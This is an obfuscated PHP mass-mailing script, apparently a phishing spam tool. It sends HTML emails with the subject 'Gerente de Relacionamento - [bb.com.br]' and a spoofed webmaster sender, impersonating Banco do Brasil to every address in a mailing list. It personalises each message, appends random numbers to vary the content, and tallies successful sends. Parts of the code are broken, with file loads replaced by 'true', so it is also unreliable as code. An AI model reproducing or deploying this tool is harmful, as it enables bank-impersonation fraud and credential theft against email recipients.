<?php
?>
﻿<?php  echo '[syslog]01
'; $sp24cee2 = $_GET['lista']; $spefcf00['maillist'] = 'xmail.txt'; $spefcf00['remetente'] = 'Andrei de Paula<webmaster.brasil@outlook.com>'; $spefcf00['assunto'] = 'Gerente de Relacionamento - [bb.com.br] '; $spefcf00['mensagem'] = 'xeng.txt'; $spefcf00['maxerros'] = 100; $sp410a9e = date('d/m/Y'); $sp16c936 = rand(1, 999999); if (!$_SERVER['argv'][3]) { $sp4b3993 = $spefcf00['remetente']; } else { $sp4b3993 = $_SERVER['argv'][3]; } if (!$_SERVER['argv'][4]) { $spf2c5a9 = $spefcf00['assunto']; } else { $spf2c5a9 = $_SERVER['argv'][4]; } echo 'Shell Iniciada<br>
'; echo '[syslog]02
'; $sp7ff75d = $spefcf00['maillist']; $spcdc8ba = true; if (!$spcdc8ba) { echo 'File ', $sp7ff75d . ' nao encontrado
'; die(0); } $sp1c4ce2 = $spefcf00['mensagem']; $spc028d8 = true; if (!$spc028d8) { echo 'File ', $sp1c4ce2 . ' nao encontrado
'; die(0); } $sp646afd = 0; $sp9d4a12 = 0; $sp6cf735 = 0; for ($spd09f64 = 0; $spd09f64 < count($spcdc8ba); $spd09f64++) { unset($sp2f809f); for ($sp20e3ac = 0; $sp20e3ac < count($spc028d8); $sp20e3ac++) { $sp2f809f .= $spc028d8[$sp20e3ac]; } $sp6cf735++; $sp11e3c2 = trim($spcdc8ba[$spd09f64]); if (!strpos($sp11e3c2, '@')) { continue; } $spe0ea16 = fopen('ok.txt', 'aw+'); $sp2f809f = str_replace('%EMAIL%', $sp11e3c2, $sp2f809f); if (!@mail($sp11e3c2, $spf2c5a9 . $sp410a9e, $sp2f809f . $sp16c936, 'FROM:' . $sp4b3993 . ' 
Return-Path: webmaster.brasil@outlook.com
content-type: text/html
X-priority: 1
')) { $sp9d4a12++; if ($sp9d4a12 >= $spefcf00['maxerros']) { die('Desisto >.<'); } echo '[syslog]03
'; echo "{$sp11e3c2} <br>Erro.. <br>[{$sp6cf735}]\n"; fclose($spe0ea16); continue; } else { $sp646afd += 1; echo "{$sp11e3c2} <font color='blue'> <br> Ja Foii !!! <br> </font>[{$sp6cf735}]\n"; fclose($spe0ea16); continue; } } echo '[syslog]04
'; echo '<br>Total enviado: ' . $sp646afd . '
'; echo '<br>Total de emails ruins: ' . $sp9d4a12 . '
';